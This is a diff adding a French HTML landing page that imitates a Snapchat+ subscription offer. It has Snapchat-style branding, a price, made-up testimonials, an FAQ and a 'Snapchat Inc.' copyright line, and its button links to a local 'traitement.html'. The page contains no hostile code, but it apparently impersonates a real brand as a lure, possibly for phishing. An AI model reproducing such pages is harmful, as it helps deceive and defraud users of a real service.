@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#FFFC00">
+    <meta name="description" content="Snapchat+ - Accédez à des fonctionnalités exclusives">
+    <title>Snapchat+</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <style>
+        /* System Variables */
+        :root {
+            --snap-yellow: #FFFC00;
+            --snap-yellow-dark: #F0E800;
+            --snap-black: #000000;
+            --snap-white: #FFFFFF;
+            --snap-gray: #F5F5F5;
+            --snap-gray-dark: #E5E5E5;
+            --snap-text-primary: #262626;
+            --snap-text-secondary: #8E8E8E;
+            --snap-text-tertiary: #C7C7C7;
+            --snap-shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+            --snap-shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --snap-shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --snap-radius-sm: 4px;
+            --snap-radius-md: 8px;
+            --snap-radius-lg: 12px;
+            --snap-radius-xl: 16px;
+            --snap-radius-full: 9999px;
+            --snap-transition-all: all 0.2s ease-in-out;
+            --snap-transition-colors: color 0.2s ease-in-out, background-color 0.2s ease-in-out, border-color 0.2s ease-in-out;
+            --snap-space-xxs: 4px;
+            --snap-space-xs: 8px;
+            --snap-space-sm: 12px;
+            --snap-space-md: 16px;
+            --snap-space-lg: 24px;
+            --snap-space-xl: 32px;
+            --snap-space-xxl: 48px;
+        }
+
+        /* Base Styles */
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+        }
+
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            line-height: 1.5;
+            color: var(--snap-text-primary);
+            background-color: var(--snap-white);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* Layout System */
+        .snap-container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: var(--snap-space-md);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .snap-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            background-color: var(--snap-yellow);
+            padding: var(--snap-space-md);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: var(--snap-shadow-sm);
+        }
+
+        .snap-main {
+            margin-top: 60px;
+            flex: 1;
+        }
+
+        .snap-footer {
+            padding: var(--snap-space-lg) var(--snap-space-md);
+            text-align: center;
+            color: var(--snap-text-secondary);
+            font-size: 14px;
+            background-color: var(--snap-gray);
+            border-top: 1px solid var(--snap-gray-dark);
+        }
+
+        /* Logo & Branding */
+        .snap-brand {
+            display: flex;
+            align-items: center;
+            gap: var(--snap-space-xs);
+            text-decoration: none;
+        }
+
+        .snap-logo {
+            width: 24px;
+            height: 24px;
+        }
+
+        .snap-brand-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--snap-black);
+            letter-spacing: -0.5px;
+        }
+
+        .snap-plus-badge {
+            background-color: var(--snap-black);
+            color: var(--snap-yellow);
+            font-size: 12px;
+            font-weight: 700;
+            padding: 2px 6px;
+            border-radius: var(--snap-radius-sm);
+            margin-left: 4px;
+        }
+
+        /* Premium Hero Section */
+        .snap-premium-hero {
+            position: relative;
+            height: 280px;
+            background: linear-gradient(135deg, var(--snap-yellow), var(--snap-yellow-dark));
+            border-radius: var(--snap-radius-xl);
+            overflow: hidden;
+            margin-bottom: var(--snap-space-xl);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: var(--snap-space-xl);
+            color: var(--snap-black);
+        }
+
+        .snap-ghost {
+            position: absolute;
+            width: 120px;
+            height: 120px;
+            bottom: -30px;
+            right: -30px;
+            opacity: 0.1;
+        }
+
+        .snap-premium-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: var(--snap-space-sm);
+            z-index: 2;
+        }
+
+        .snap-premium-subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: var(--snap-space-lg);
+            z-index: 2;
+            max-width: 300px;
+        }
+
+        /* Features Grid */
+        .snap-features {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: var(--snap-space-md);
+            margin-bottom: var(--snap-space-xl);
+        }
+
+        .snap-feature-card {
+            background-color: var(--snap-white);
+            border-radius: var(--snap-radius-lg);
+            padding: var(--snap-space-lg);
+            box-shadow: var(--snap-shadow-sm);
+            border: 1px solid var(--snap-gray-dark);
+            transition: var(--snap-transition-all);
+            text-align: center;
+        }
+
+        .snap-feature-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--snap-shadow-md);
+        }
+
+        .snap-feature-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto var(--snap-space-md);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: var(--snap-yellow);
+            border-radius: var(--snap-radius-full);
+        }
+
+        .snap-feature-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .snap-feature-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: var(--snap-space-xs);
+        }
+
+        .snap-feature-desc {
+            font-size: 14px;
+            color: var(--snap-text-secondary);
+        }
+
+        /* Pricing Section */
+        .snap-pricing {
+            background-color: var(--snap-gray);
+            border-radius: var(--snap-radius-xl);
+            padding: var(--snap-space-xl);
+            margin-bottom: var(--snap-space-xl);
+            text-align: center;
+        }
+
+        .snap-pricing-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: var(--snap-space-md);
+        }
+
+        .snap-price {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: var(--snap-space-md);
+            color: var(--snap-black);
+        }
+
+        .snap-price-period {
+            font-size: 16px;
+            color: var(--snap-text-secondary);
+            font-weight: 400;
+        }
+
+        .snap-price-features {
+            list-style: none;
+            margin-bottom: var(--snap-space-xl);
+        }
+
+        .snap-price-feature {
+            display: flex;
+            align-items: center;
+            gap: var(--snap-space-sm);
+            margin-bottom: var(--snap-space-sm);
+            font-size: 14px;
+        }
+
+        .snap-price-feature svg {
+            width: 16px;
+            height: 16px;
+            color: var(--snap-yellow);
+        }
+
+        /* CTA Button */
+        .snap-cta-button {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: var(--snap-space-md);
+            background-color: var(--snap-black);
+            color: var(--snap-yellow);
+            border: none;
+            border-radius: var(--snap-radius-lg);
+            font-size: 16px;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            transition: var(--snap-transition-colors);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .snap-cta-button:hover {
+            background-color: #111;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .snap-cta-button:active {
+            transform: translateY(0);
+        }
+
+        /* Testimonials */
+        .snap-testimonials {
+            margin-bottom: var(--snap-space-xl);
+        }
+
+        .snap-testimonials-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: var(--snap-space-lg);
+            text-align: center;
+        }
+
+        .snap-testimonial {
+            background-color: var(--snap-white);
+            border-radius: var(--snap-radius-lg);
+            padding: var(--snap-space-lg);
+            margin-bottom: var(--snap-space-md);
+            box-shadow: var(--snap-shadow-sm);
+            border: 1px solid var(--snap-gray-dark);
+        }
+
+        .snap-testimonial-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: var(--snap-space-md);
+        }
+
+        .snap-testimonial-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: var(--snap-radius-full);
+            margin-right: var(--snap-space-sm);
+            background-color: var(--snap-gray);
+        }
+
+        .snap-testimonial-author {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .snap-testimonial-text {
+            font-size: 14px;
+            color: var(--snap-text-primary);
+            line-height: 1.6;
+        }
+
+        /* FAQ Section */
+        .snap-faq {
+            margin-bottom: var(--snap-space-xl);
+        }
+
+        .snap-faq-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: var(--snap-space-lg);
+            text-align: center;
+        }
+
+        .snap-faq-item {
+            margin-bottom: var(--snap-space-md);
+            border-bottom: 1px solid var(--snap-gray-dark);
+            padding-bottom: var(--snap-space-md);
+        }
+
+        .snap-faq-question {
+            font-weight: 600;
+            margin-bottom: var(--snap-space-xs);
+            font-size: 15px;
+        }
+
+        .snap-faq-answer {
+            font-size: 14px;
+            color: var(--snap-text-secondary);
+            line-height: 1.6;
+        }
+
+        /* Animations */
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .snap-float {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .snap-pulse {
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 480px) {
+            .snap-features {
+                grid-template-columns: 1fr;
+            }
+            
+            .snap-premium-hero {
+                height: 240px;
+                padding: var(--snap-space-lg);
+            }
+            
+            .snap-premium-title {
+                font-size: 24px;
+            }
+            
+            .snap-price {
+                font-size: 36px;
+            }
+        }
+
+        /* Dark Mode Support */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --snap-black: #FFFFFF;
+                --snap-white: #121212;
+                --snap-gray: #1E1E1E;
+                --snap-gray-dark: #2E2E2E;
+                --snap-text-primary: #F5F5F5;
+                --snap-text-secondary: #A5A5A5;
+                --snap-text-tertiary: #6E6E6E;
+                --snap-shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.3);
+                --snap-shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.2), 0 2px 4px -1px rgba(0, 0, 0, 0.15);
+                --snap-shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.25), 0 4px 6px -2px rgba(0, 0, 0, 0.15);
+            }
+            
+            .snap-feature-card,
+            .snap-testimonial {
+                background-color: var(--snap-white);
+                border-color: var(--snap-gray-dark);
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="snap-header animate__animated animate__fadeIn">
+        <a href="#" class="snap-brand">
+            <svg class="snap-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="var(--snap-black)" stroke="var(--snap-black)" stroke-width="2"/>
+                <path d="M12 17C14.7614 17 17 14.7614 17 12C17 9.23858 14.7614 7 12 7C9.23858 7 7 9.23858 7 12C7 14.7614 9.23858 17 12 17Z" fill="var(--snap-yellow)" stroke="var(--snap-yellow)" stroke-width="2"/>
+            </svg>
+            <span class="snap-brand-name">Snapchat<span class="snap-plus-badge">+</span></span>
+        </a>
+    </header>
+
+    <!-- Main Content -->
+    <main class="snap-main">
+        <div class="snap-container">
+            <!-- Premium Hero Section -->
+            <section class="snap-premium-hero animate__animated animate__fadeIn">
+                <svg class="snap-ghost snap-float" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M60 120C93.1371 120 120 93.1371 120 60C120 26.8629 93.1371 0 60 0C26.8629 0 0 26.8629 0 60C0 93.1371 26.8629 120 60 120Z" fill="var(--snap-black)"/>
+                    <path d="M45 50C47.7614 50 50 47.7614 50 45C50 42.2386 47.7614 40 45 40C42.2386 40 40 42.2386 40 45C40 47.7614 42.2386 50 45 50Z" fill="var(--snap-yellow)"/>
+                    <path d="M75 50C77.7614 50 80 47.7614 80 45C80 42.2386 77.7614 40 75 40C72.2386 40 70 42.2386 70 45C70 47.7614 72.2386 50 75 50Z" fill="var(--snap-yellow)"/>
+                    <path d="M50 75C50 77.7614 47.7614 80 45 80C42.2386 80 40 77.7614 40 75C40 72.2386 42.2386 70 45 70C47.7614 70 50 72.2386 50 75Z" fill="var(--snap-yellow)"/>
+                    <path d="M80 75C80 77.7614 77.7614 80 75 80C72.2386 80 70 77.7614 70 75C70 72.2386 72.2386 70 75 70C77.7614 70 80 72.2386 80 75Z" fill="var(--snap-yellow)"/>
+                </svg>
+                <h1 class="snap-premium-title">Snapchat+ Premium</h1>
+                <p class="snap-premium-subtitle">Accédez à des fonctionnalités exclusives et personnalisez votre expérience Snapchat</p>
+            </section>
+
+            <!-- Features Grid -->
+            <section class="snap-features animate__animated animate__fadeIn animate__delay-1s">
+                <div class="snap-feature-card">
+                    <div class="snap-feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+                        </svg>
+                    </div>
+                    <h3 class="snap-feature-title">Badge exclusif</h3>
+                    <p class="snap-feature-desc">Affichez un badge spécial sur votre profil</p>
+                </div>
+                
+                <div class="snap-feature-card">
+                    <div class="snap-feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/>
+                        </svg>
+                    </div>
+                    <h3 class="snap-feature-title">Filtres premium</h3>
+                    <p class="snap-feature-desc">Accès à des filtres et lentilles exclusifs</p>
+                </div>
+                
+                <div class="snap-feature-card">
+                    <div class="snap-feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+                        </svg>
+                    </div>
+                    <h3 class="snap-feature-title">Statut des messages</h3>
+                    <p class="snap-feature-desc">Voyez qui a ouvert vos snaps</p>
+                </div>
+                
+                <div class="snap-feature-card">
+                    <div class="snap-feature-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+                        </svg>
+                    </div>
+                    <h3 class="snap-feature-title">Support prioritaire</h3>
+                    <p class="snap-feature-desc">Accès rapide à l'équipe d'assistance</p>
+                </div>
+            </section>
+
+            <!-- Pricing Section -->
+            <section class="snap-pricing animate__animated animate__fadeIn animate__delay-1s">
+                <h2 class="snap-pricing-title">Abonnement Snapchat+</h2>
+                <div class="snap-price">€4.99<span class="snap-price-period">/mois</span></div>
+                
+                <ul class="snap-price-features">
+                    <li class="snap-price-feature">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+                            <polyline points="22 4 12 14.01 9 11.01"/>
+                        </svg>
+                        Toutes les fonctionnalités premium
+                    </li>
+                    <li class="snap-price-feature">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+                            <polyline points="22 4 12 14.01 9 11.01"/>
+                        </svg>
+                        Annulation à tout moment
+                    </li>
+                    <li class="snap-price-feature">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+                            <polyline points="22 4 12 14.01 9 11.01"/>
+                        </svg>
+                        Essai gratuit de 7 jours
+                    </li>
+                </ul>
+                
+                <a href="traitement.html" class="snap-cta-button snap-pulse">
+                    Essayer Snapchat+
+                </a>
+            </section>
+
+            <!-- Testimonials -->
+            <section class="snap-testimonials animate__animated animate__fadeIn animate__delay-2s">
+                <h2 class="snap-testimonials-title">Ce qu'en pensent nos membres</h2>
+                
+                <div class="snap-testimonial">
+                    <div class="snap-testimonial-header">
+                        <div class="snap-testimonial-avatar"></div>
+                        <div class="snap-testimonial-author">Marie D.</div>
+                    </div>
+                    <p class="snap-testimonial-text">"Les filtres exclusifs valent vraiment le coup ! J'adore pouvoir personnaliser mes snaps avec des effets uniques."</p>
+                </div>
+                
+                <div class="snap-testimonial">
+                    <div class="snap-testimonial-header">
+                        <div class="snap-testimonial-avatar"></div>
+                        <div class="snap-testimonial-author">Thomas L.</div>
+                    </div>
+                    <p class="snap-testimonial-text">"Le badge Snapchat+ me donne un statut spécial parmi mes amis. Tout le monde me demande comment l'avoir !"</p>
+                </div>
+            </section>
+
+            <!-- FAQ Section -->
+            <section class="snap-faq animate__animated animate__fadeIn animate__delay-2s">
+                <h2 class="snap-faq-title">Questions fréquentes</h2>
+                
+                <div class="snap-faq-item">
+                    <h3 class="snap-faq-question">Comment annuler mon abonnement ?</h3>
+                    <p class="snap-faq-answer">Vous pouvez annuler à tout moment via les paramètres de votre compte. Votre abonnement restera actif jusqu'à la fin de la période payée.</p>
+                </div>
+                
+                <div class="snap-faq-item">
+                    <h3 class="snap-faq-question">Quand serai-je facturé ?</h3>
+                    <p class="snap-faq-answer">Votre carte sera facturée chaque mois à la même date. Vous recevrez une notification 3 jours avant chaque renouvellement.</p>
+                </div>
+                
+                <div class="snap-faq-item">
+                    <h3 class="snap-faq-question">Puis-je essayer avant d'acheter ?</h3>
+                    <p class="snap-faq-answer">Oui ! Profitez d'un essai gratuit de 7 jours pour découvrir toutes les fonctionnalités premium.</p>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="snap-footer animate__animated animate__fadeIn animate__delay-3s">
+        <p>© 2023 Snapchat Inc. Tous droits réservés.</p>
+    </footer>
+</body>
+</html>
